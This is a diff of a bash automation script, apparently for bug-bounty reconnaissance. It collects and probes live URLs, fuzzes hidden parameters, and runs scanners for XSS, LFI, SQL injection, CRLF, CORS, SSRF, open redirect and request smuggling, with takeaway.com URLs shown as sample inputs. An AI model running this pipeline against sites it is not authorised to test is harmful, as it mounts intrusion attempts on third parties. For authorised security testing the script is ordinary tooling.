@@ -92,34 +92,50 @@ gf ssti $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\
 
 get_hidden_params(){
   mkdir -p $output_directory/ffuf_hidden_params
-  ffuf -w $output_directory/final_full_live_urls.txt -s -u FUZZ -t 100 -se -r -sf  -od $output_directory/ffuf_hidden_params/ -r
+  echo "Scanning for hidden params............."
+  ffuf -w $output_directory/200.txt -s -u FUZZ -t 100 -se -r -sf  -od $output_directory/ffuf_hidden_params/ -r
   cd $output_directory/
-  extract_hidden_param.py -i "ffuf_hidden_params/*" -u $output_directory/final_full_live_urls.txt  -p $output_directory/output/hidden_params.txt
+  extract_hidden_param.py -i "ffuf_hidden_params/*" -u $output_directory/200.txt  -p $output_directory/output/hidden_params.txt
   cat $output_directory/output/hidden_params.txt >> $output_directory/output/params.txt
+
+  cd $output_directory/ffuf_hidden_params
+  grep  -Eo "var [a-zA-Z0-9_]+" * |awk '{print $2}' | awk '!seen[$0]++' > $output_directory/output/vars.txt
+  cat $output_directory/output/vars.txt >> $output_directory/output/params.txt
+
+  rm_dup_file $output_directory/output/params.txt
 }
 
 build_urls(){
 mkdir -p $output_directory/build_urls
-
-path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/ssrf.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/ssrf.txt
-
 echo "Building ssrf urls"
 
-path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/LFI.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/LFI.txt
+# path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/ssrf.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/ssrf.txt
+path_plus_param.py -f  ~/Wordlist/parameter/ssrf.txt -f $output_directory/output/vars.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/ssrf.txt
 
-echo "Building lfi urls"
+# echo "Building lfi urls"
+# path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/LFI.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/LFI.txt
+
 
 
 # path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/Open_redirect.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/Open_redirect.txt
 
-path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/columns.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/xss.txt
 
 echo "Building xss urls"
+
+path_plus_param.py -f  $output_directory/output/params.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/xss.txt
+# path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/columns.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/xss.txt
+
 
 
 
 # # for sqli, needing to append ' at the end of query value, so it is different from other test input
 #qsreplace -a %23 > $output_directory/build_urls/sqli.txt
+}
+
+remove_files(){
+  rm $output_directory/build_urls/xss.txt
+  rm  $output_directory/build_urls/ssrf.txt
+  
 }
 
 mkdir -p $output_directory/
@@ -130,20 +146,20 @@ echo "Input file from gau      $file  "
 cat $file | sed -E -e '/(\.jpg|\.png|\.gif|\.woff|\.css|\.ico|\.js|\.swf|\.zip|\.JPG|\.mp3|\.mov|\.svg|\.jpeg|\.map|\.pdf|\.txt)/d'| sed '/^[[:space:]]*$/d' > $output_directory/filtered_url.txt
 echo "Remove urls with boring extensions"
 
-grep -P "\w+\.js(\?|$)" $file > $output_directory/js_urls.txt
+
 
 echo "Remove urls with boring extensions     $output_directory/filtered_url.txt "
 
 
-cat $output_directory/filtered_url.txt | wordlistgen > $output_directory/output/wordlist.txt
+cat $output_directory/filtered_url.txt | wordlistgen > $output_directory/output/wordlistgen.txt
 
-echo "Using wordlistgen     $output_directory/output/wordlist.txt "
+echo "Using wordlistgen     $output_directory/output/wordlistgen.txt "
 
 
 
-cat $output_directory/filtered_url.txt | urinteresting >  $output_directory/maybeinteresting_urls.txt
+cat $output_directory/filtered_url.txt | urinteresting >  $output_directory/output/maybeinteresting_urls.txt
 
-echo "find urls which may contain interesting things such as admin,proxy  $output_directory/maybeinteresting_urls.txt"
+echo "find urls which may contain interesting things such as admin,proxy  $output_directory/output/maybeinteresting_urls.txt"
 
 cat $output_directory/filtered_url.txt | unfurl keys | awk '!seen[$0]++'   > $output_directory/output/params.txt
 echo  "Extract parameters of query string               $output_directory/output/params.txt "
@@ -151,30 +167,47 @@ echo  "Extract parameters of query string               $output_directory/output
 awk '/?/ && /=/' $output_directory/filtered_url.txt > $output_directory/with_querystring_urls.txt
 echo  "Only keeps urls with query string   $output_directory/with_querystring_urls.txt" 
 
-count=$(wc -l $output_directory/with_querystring_urls.txt| awk '{print $1}')
-
-count=$(expr $count + 1)
-if [ "$count" -lt 99999 ]
-then 
-    halive $output_directory/with_querystring_urls.txt -t 100 --output $output_directory/halive.txt
-    egrep '302|301|200' $output_directory/halive.txt | awk 'BEGIN { FS = "," } ; { print $1 }' > $output_directory/live_urls.txt
-else 
-    cat $output_directory/with_querystring_urls.txt |  fff -s 301 -s 301 -s 200 > $output_directory/halive.txt  
-    awk '{print $1}' $output_directory/halive.txt > $output_directory/live_urls.txt
-fi
-echo " Obtain currentlly live urls           $output_directory/live_urls.txt  "
-
-
-
-
 mkdir -p $output_directory/temp_processing/
 
 
-cat $output_directory/live_urls.txt | unfurl -u format " %p?%q"   >  $output_directory/temp_processing/pathandquery.txt
+# cat $output_directory/with_querystring_urls.txt | unfurl -u format " %p?%q"   >  $output_directory/temp_processing/pathandquery.txt
+echo "Deduplicate live urls, only remain unique path and query sting   $output_directory/unique_urls.txt"
 
-deduplicate_urls.py $output_directory/temp_processing/pathandquery.txt   $output_directory/live_urls.txt $output_directory/final_full_live_urls.txt
+# deduplicate_urls.py $output_directory/temp_processing/pathandquery.txt   $output_directory/with_querystring_urls.txt $output_directory/unique_urls.txt
+cat $output_directory/with_querystring_urls.txt | urldedupe > $output_directory/unique_urls.txt
 
-echo "Deduplicate live urls, only remain unique path and query sting   $output_directory/final_full_live_urls.txt"
+count=$(wc -l $output_directory/unique_urls.txt| awk '{print $1}')
+
+echo "Check status on $count urls .................."
+
+
+# count=$(expr $count + 1)
+# if [ "$count" -lt 99999 ]
+# then 
+#     halive $output_directory/unique_urls.txt -t 100 --output $output_directory/halive.txt
+#     egrep '302|301|200' $output_directory/halive.txt | awk 'BEGIN { FS = "," } ; { print $1 }' > $output_directory/final_full_live_urls.txt
+# else 
+#   echo "using fff..............  $count urls   "
+#     cat $output_directory/unique_urls.txt |  fff -s 301 -s 302 -s 200 > $output_directory/fff.txt  
+#     awk '{print $1}' $output_directory/fff.txt > $output_directory/final_full_live_urls.txt
+# fi
+# echo " Obtain currentlly live urls           $output_directory/final_full_live_urls.txt  "
+
+
+  echo "using fff..............  $count urls   "
+    cat $output_directory/unique_urls.txt |  fff -s 301 -s 302 -s 200 -s 500 > $output_directory/fff.txt  
+    cat $output_directory/fff.txt | egrep '200|500'|   awk '{print $2}' > $output_directory/200.txt
+    cat $output_directory/fff.txt |  egrep '302|301'|  awk '{print $2}' > $output_directory/301-302.txt
+    cat $output_directory/fff.txt |  egrep '302|301|200|500'|  awk '{print $2}' > $output_directory/final_full_live_urls.txt
+    cat $output_directory/final_full_live_urls.txt | urldedupe -s  > $output_directory/dedupe_similar_urls.txt
+
+
+
+
+
+
+
+
 #final_full_live_urls.txt
 # https://www.takeaway.com/be-en/melita-beveren?gclid=CPnRucma5d8CFXyIxQIdLpgFgQ&gclsrc=ds
 # https://www.takeaway.com/pizzahutgent?utm_campaign=foodorder&utm_medium=organic&utm_sour
@@ -184,12 +217,12 @@ echo "Deduplicate live urls, only remain unique path and query sting   $output_d
 
 get_hidden_params
 
-whatweb -i $output_directory/final_full_live_urls.txt | tee $output_directory/ip.txt
+# whatweb -i $output_directory/final_full_live_urls.txt | tee $output_directory/ip.txt
 
 run_gf
 #bug with gf 
 
-cat  $output_directory/final_full_live_urls.txt | unfurl -u format "%s://%d%p" > $output_directory/temp_processing/unique_domainpaths.txt
+cat  $output_directory/200.txt | unfurl -u format "%s://%d%p" > $output_directory/temp_processing/unique_domainpaths.txt
 #https://www.takeaway.com/bg-nl/acties-en-kortingen-in-sofiya
 ``
 build_urls
@@ -197,69 +230,106 @@ build_urls
 
 #xss
 
-# echo "Using dalfox         $output_directory/output/xss_dalfox.txt "
-# cat $output_directory/final_full_live_urls.txt | dalfox pipe -w 70  --ignore-return 302,403,404 --only-discovery   -b https://ragnarokv.xss.ht  --silence  -o $output_directory/output/xss_dalfox.txt
-# grep -E -i -C 10  "reflected|triggered"    $output_directory/output/xss_dalfox.txt > $output_directory/output/dalfox_good.txt
-# echo "Finished dalfox    $output_directory/output/dalfox_good.txt  "
+
+echo "Using kxss...........    $output_directory/200.txt      $output_directory/output/xss1.txt      "
+cat $output_directory/200.txt | timeout 3h kxss >  $output_directory/output/xss1.txt
+echo "kxss finished at $(date +'%Y-%m-%d-%H-%M') for $output_directory/200.txt"
+
+echo "Using kxss...........   $output_directory/build_urls/xss.txt     $output_directory/output/xss2.txt      "
+cat $output_directory/build_urls/xss.txt | timeout 3h  kxss >  $output_directory/output/xss2.txt
+echo "kxss finished at $(date +'%Y-%m-%d-%H-%M') for $output_directory/build_urls/xss.txt"
 
 
-# cat $output_directory/build_urls/xss.txt | dalfox pipe -w 70  --ignore-return 302,403,404 -b https://ragnarokv.xss.ht  --silence  -o $output_directory/output/xss2.txt
+# echo "Using xss.py ...........       $output_directory/output/xsspy.txt      "
+#  timeout 6h xss.py -v 4 -u $output_directory/200.txt -O $output_directory/output/xsspy.txt
+# echo "xss.py finished at $(date +'%Y-%m-%d-%H-%M') for $output_directory/output/xsspy.txt"
 
-echo "Using kxss...........       $output_directory/output/xss1.txt      "
-cat $output_directory/final_full_live_urls.txt | kxss >  $output_directory/output/xss1.txt
-cat $output_directory/build_urls/xss.txt | kxss >  $output_directory/output/xss2.txt
+# echo "Using xss.py ...........       $output_directory/output/xsspy2.txt      "
+#  timeout 6h xss.py -v 4 -u $output_directory/build_urls/xss.txt -O $output_directory/output/xsspy2.txt
+# echo "xss.py finished at $(date +'%Y-%m-%d-%H-%M') for $output_directory/output/xsspy2.txt"
 
-# touch $output_directory/output/xsspy.txt
-#  timeout 2h xss.py -v 4 -u $output_directory/final_full_live_urls.txt   -t 50 -O $output_directory/output/xsspy.txt
-#  touch $output_directory/output/xsspy_vulnerable.txt
-#  grep vulnerable $output_directory/output/xsspy.txt >> $output_directory/output/xss_vulnerable.txt
+echo "Using puppeteer-xss.py  ...........       $output_directory/output/xsspy.txt      "
+ timeout 6h puppeteer-xss.py  -t 5 -v 4 -u $output_directory/200.txt -O $output_directory/output/xsspy.txt
+echo "puppeteer-xss.py  finished at $(date +'%Y-%m-%d-%H-%M') for $output_directory/200.txt"
+
+echo "Using puppeteer-xss.py  ...........       $output_directory/output/xsspy2.txt      "
+ timeout 8h puppeteer-xss.py -t 5 -v 4 -u $output_directory/build_urls/xss.txt -O $output_directory/output/xsspy2.txt
+echo "puppeteer-xss.py  finished at $(date +'%Y-%m-%d-%H-%M') for $output_directory/build_urls/xss.txt"
+
+ grep -i vulnerable $output_directory/output/xsspy.txt > $output_directory/output/xss_vulnerable.txt
+ grep -i vulnerable $output_directory/output/xsspy2.txt >> $output_directory/output/xss_vulnerable.txt
 
 
 
 
 #lfi
  echo "Scanning for lfi ...   $output_directory/output/lfi1.txt "
- lfi.py -v 4 -u $output_directory/final_full_live_urls.txt  -t 15 -n $output_directory/output/lfi1.txt
- touch $output_directory/output/lfi_vulnerable.txt
- grep vulnerable $output_directory/output/lfi1.txt > $output_directory/output/lfi_vulnerable.txt
-timeout 3h  lfi.py -v 4 -u $output_directory/final_full_live_urls.txt   -t 15  -n  $output_directory/output/lfi2.txt
- grep vulnerable $output_directory/output/lfi2.txt >> $output_directory/output/lfi_vulnerable.txt
+  timeout 8h lfi.py -v 4 -u $output_directory/200.txt   -O $output_directory/output/lfi1.txt
+ grep -i vulnerable $output_directory/output/lfi1.txt > $output_directory/output/lfi_vulnerable.txt
 
+echo "lfi.py finished at $(date +'%Y-%m-%d-%H-%M')"
  echo "Finished scanning of  lfi ...   $output_directory/output/lfi_vulnerable.txt "
 
 
 
 
 #open_redirect
-cat $output_directory/final_full_live_urls.txt | grep --color -iE "(callback=|checkout=|checkout_url=|continue=|data=|dest=|destination=|dir=|domain=|feed=|file=|file_name=|file_url=|folder=|folder_url=|forward=|from_url=|go=|goto=|host=|html=|image_url=|img_url=|load_file=|load_url=|login_url=|logout=|navigation=|next=|next_page=|Open=|out=|page=|page_url=|path=|port=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|reference=|return=|return_path=|return_to=|returnTo=|return_url=|rt=|rurl=|show=|site=|target=|to=|uri=|url=|val=|validate=|view=|RedirectUrl=|Return=|ReturnUrl=|ClientSideUrl=|failureUrl=|ru=|relayState=|fallbackurl=|clickurl=|dest_url=|urlReturn=|referer=|appUrlScheme=|cgi-bin/redirect.cgi=|window=)" > $output_directory/build_urls/Open_redirect_input.txt
+cat $output_directory/301-302.txt | grep --color -iE "(callback=|checkout=|checkout_url=|continue=|data=|dest=|destination=|dir=|domain=|feed=|file=|file_name=|file_url=|folder=|folder_url=|forward=|from_url=|go=|goto=|host=|html=|image_url=|img_url=|load_file=|load_url=|login_url=|logout=|navigation=|next=|next_page=|Open=|out=|page=|page_url=|path=|port=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|reference=|return=|return_path=|return_to=|returnTo=|return_url=|rt=|rurl=|show=|site=|target=|to=|uri=|url=|val=|validate=|view=|RedirectUrl=|Return=|ReturnUrl=|ClientSideUrl=|failureUrl=|ru=|relayState=|fallbackurl=|clickurl=|dest_url=|urlReturn=|referer=|appUrlScheme=|cgi-bin/redirect.cgi=|window=|re|r|url|new)" > $output_directory/build_urls/Open_redirect_input.txt
  redirect_replaceparam.py -f $output_directory/build_urls/Open_redirect_input.txt > $output_directory/build_urls/Open_redirect_ffuf.txt
+echo "ffuing $output_directory/build_urls/Open_redirect_ffuf.txt"
+ffuf -w  $output_directory/build_urls/Open_redirect_ffuf.txt -H "X-Real-IP: 127.0.0.1" -u FUZZ -t 100  -r  -s
 
-ffuf -w  $output_directory/build_urls/Open_redirect_ffuf.txt -H X-Real-IP: 127.0.0.1 -u FUZZ -t 100 -se -r  -s
 
-# cat $output_directory/build_urls/Open_redirect_input.txt | qsfuzz -c ~/Wordlist/qsfuzz/open_redirect.yaml -w 100 | tee $output_directory/output/openredirect1.txt
+# echo "Using  openredirect.py .....  $output_directory/output/openredirectpy.txt"
+# timeout 4h openredirect.py -u $output_directory/build_urls/Open_redirect_input.txt -O $output_directory/output/openredirectpy.txt
+#  grep -i vulnerable $output_directory/output/openredirectpy.txt > $output_directory/output/redirect_vulnerable.txt
 
-# openredirex.py -l $output_directory/build_urls/Open_redirect_input.txt -p /root/Wordlist/payload/openredirect_better.txt --keyword FUZZ | tee $output_directory/output/openredirect1.txt
-# openredirex.py -l $output_directory/build_urls/Open_redirect.txt -p /root/Wordlist/payload/openredirect_better.txt --keyword FUZZ | tee $output_directory/output/openredirect2.txt
+
 
 
 
 #sqlid
 echo "Scanning sqli  $output_directory/output/sqli1.txt  "
-cat $output_directory/final_full_live_urls.txt | qsfuzz -c ~/Wordlist/qsfuzz/sqli.yaml -w 100 | tee $output_directory/output/sqli1.txt
+cat $output_directory/200.txt |  timeout 6h qsfuzz -c ~/Wordlist/qsfuzz/sqli.yaml -w 100 | tee $output_directory/output/sqli1.txt
 
 #crlf 
 echo "Scanning crlf  $output_directory/output/crlf.txt  "
 
-cat $output_directory/final_full_live_urls.txt | qsfuzz -c ~/Wordlist/qsfuzz/crlf.yaml -w 100 | tee $output_directory/output/crlf.txt
+cat $output_directory/200.txt |  timeout 3h qsfuzz -c ~/Wordlist/qsfuzz/crlf.yaml -w 100 | tee $output_directory/output/crlf.txt
+
+echo "Scanning crlf  using crlf.py  $output_directory/output/crlfpy.txt  "
+timeout 4h crlf.py -u $output_directory/200.txt -v 4 -t 80 -O $output_directory/output/crlfpy.txt
+ grep -i vulnerable $output_directory/output/crlfpy.txt > $output_directory/output/crlf_vulnerable.txt
+
+echo "crlf.py finished at $(date +'%Y-%m-%d-%H-%M')"
+
+ #cors 
+ echo "Scanning cors  using cors.py  $output_directory/output/corspy.txt  "
+timeout 4h cors.py -u $output_directory/200.txt -v 4 -t 80  -O $output_directory/output/corspy.txt
+ grep -i vulnerable $output_directory/output/corspy.txt > $output_directory/output/cors_vulnerable.txt
+
+echo "cors.py finished at $(date +'%Y-%m-%d-%H-%M')"
+
+
 
 #ssrf 
 echo "Building urls for ssrf   $output_directory/build_urls/ssrf_ffuf1.txt  "
-ssrf_replaceparam.py -f $output_directory/final_full_live_urls.txt > $output_directory/build_urls/ssrf_ffuf1.txt
-ssrf_replaceparam.py -f $output_directory/build_urls/ssrf.txt > $output_directory/build_urls/ssrf_ffuf2.txt
+ssrf_replaceparam.py -f $output_directory/200.txt > $output_directory/build_urls/ssrf_ffuf1.txt
+ssrf_replaceparam.py -f $output_directory/build_urls/ssrf.txt -a > $output_directory/build_urls/ssrf_ffuf2.txt
 
 echo "Ffufing generaterd ssrf urls   "
 
-ffuf -w $output_directory/build_urls/ssrf_ffuf1.txt -u FUZZ -t 100 -r  -s -H X-Real-IP: 127.0.0.1
-timeout 3h ffuf -w $output_directory/build_urls/ssrf_ffuf2.txt -u FUZZ -t 100 -r -s -H X-Real-IP: 127.0.0.1
+ffuf -w $output_directory/build_urls/ssrf_ffuf1.txt -u FUZZ -t 100 -r  -s -H "X-Real-IP: 127.0.0.1"
+timeout 3h ffuf -w $output_directory/build_urls/ssrf_ffuf2.txt -u FUZZ -t 100 -r -s -H "X-Real-IP: 127.0.0.1"
 psql -d ssrf  -c "SELECT * FROM ssrf_records where  created_on > current_date - interval '7 days'" --csv > $output_directory/output/ssrf.csv
 
+
+ #request smuggling  
+ echo "Scanning request smuggling  using smuggler_gwen001.py  $output_directory/output/smuggler.txt  "
+timeout 10h smuggler_gwen001.py -u $output_directory/dedupe_similar_urls.txt -v 4 -t 150  -O $output_directory/output/smuggler.txt
+echo "smuggler_gwen001.py finished at $(date +'%Y-%m-%d-%H-%M')"
+
+ grep -i vulnerable $output_directory/output/smuggler.txt > $output_directory/output/smuggler_vulnerable.txt
+
+
+remove_files
